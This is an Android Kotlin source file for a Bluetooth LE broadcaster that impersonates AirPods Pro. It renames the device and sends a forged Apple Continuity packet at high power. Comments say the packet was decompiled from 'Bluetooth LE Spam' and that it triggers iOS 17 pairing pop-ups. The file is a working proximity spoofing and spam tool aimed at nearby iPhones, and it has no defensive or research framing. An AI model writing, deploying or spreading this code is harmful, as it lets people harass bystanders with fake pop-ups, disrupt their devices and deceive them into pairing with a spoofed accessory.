package com.airpods.signal

import android.bluetooth.BluetoothAdapter
import android.bluetooth.le.*
import android.os.Build
import android.util.Log

class BleBroadcaster(private val bluetoothAdapter: BluetoothAdapter) {

    private var advertiser: BluetoothLeAdvertiser? = null
    var isAdvertising = false
        private set

    var lastResult = ""
        private set

    private val callback = object : AdvertiseCallback() {
        override fun onStartSuccess(settingsInEffect: AdvertiseSettings) {
            isAdvertising = true
            Log.d("BleBroadcaster", "广播启动成功")
        }

        override fun onStartFailure(errorCode: Int) {
            isAdvertising = false
            val errorMsg = when (errorCode) {
                ADVERTISE_FAILED_ALREADY_STARTED -> "已经在广播"
                ADVERTISE_FAILED_DATA_TOO_LARGE -> "广播数据过大"
                ADVERTISE_FAILED_FEATURE_UNSUPPORTED -> "设备不支持此功能"
                ADVERTISE_FAILED_INTERNAL_ERROR -> "内部错误"
                ADVERTISE_FAILED_TOO_MANY_ADVERTISERS -> "广播者过多"
                else -> "未知错误($errorCode)"
            }
            Log.e("BleBroadcaster", "广播启动失败: $errorMsg")
        }
    }

    fun selfCheck(): List<String> {
        val results = mutableListOf<String>()
        if (!bluetoothAdapter.isEnabled) results.add("❌ 蓝牙未开启")
        else results.add("✅ 蓝牙已开启")

        val leAdvertiser = bluetoothAdapter.bluetoothLeAdvertiser
        if (leAdvertiser == null) results.add("❌ 不支持 BLE 外设广播模式")
        else results.add("✅ 支持 BLE 外设广播模式")

        results.add("\n📡 使用 Apple Continuity 协议:")
        results.add("   完整 27 字节广播报文")
        results.add("   来源: Bluetooth LE Spam 逆向")
        results.add("   支持 iOS 17 弹窗")
        return results
    }

    fun start(): String {
        lastResult = ""
        advertiser = bluetoothAdapter.bluetoothLeAdvertiser
            ?: run {
                lastResult = "❌ 设备不支持 BLE 广播"
                return lastResult
            }

        // 改名
        try { bluetoothAdapter.name = "AirPods Pro" } catch (_: Exception) {}
        try { Thread.sleep(200) } catch (_: Exception) {}

        // ★★★ Apple Continuity 协议报文 ★★★
        // 从 Bluetooth LE Spam 反编译提取
        // AirPods Pro 的完整 Continuity 广播数据
        //
        // 格式: 07 + 能力 + 设备类型 + 认证数据 + 状态 + 电量 + 填充
        val continuityData = byteArrayOf(
            0x07,             // Setup Type (配对弹窗触发)
            0x19, 0x07,       // Device Capabilities (0x0719)
            0x0E,             // 设备类型: AirPods Pro
            0x20, 0x75, 0xAA, 0x30, // 认证/加密标识
            0x01, 0x00, 0x00,       // 状态/特征
            0x45, 0x12, 0x12, 0x12, // 电量信息
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00
        )

        val advertiseData = AdvertiseData.Builder()
            .addManufacturerData(0x004C, continuityData)
            .setIncludeDeviceName(true)
            .build()

        val scanResponse = AdvertiseData.Builder()
            .setIncludeDeviceName(true)
            .build()

        val settings = AdvertiseSettings.Builder()
            .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
            .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
            .setConnectable(true)
            .build()

        try {
            advertiser?.startAdvertising(settings, advertiseData, scanResponse, callback)
            isAdvertising = true
            lastResult = "📡 信号已发射"
            return lastResult
        } catch (e: SecurityException) {
            lastResult = "❌ 缺少蓝牙广播权限"
        } catch (e: Exception) {
            lastResult = "❌ 广播失败: ${e.localizedMessage}"
        }

        return lastResult
    }

    fun stop(): String {
        try { advertiser?.stopAdvertising(callback) } catch (_: Exception) {}
        advertiser = null
        isAdvertising = false
        lastResult = "⏹ 已停止"
        return lastResult
    }
}
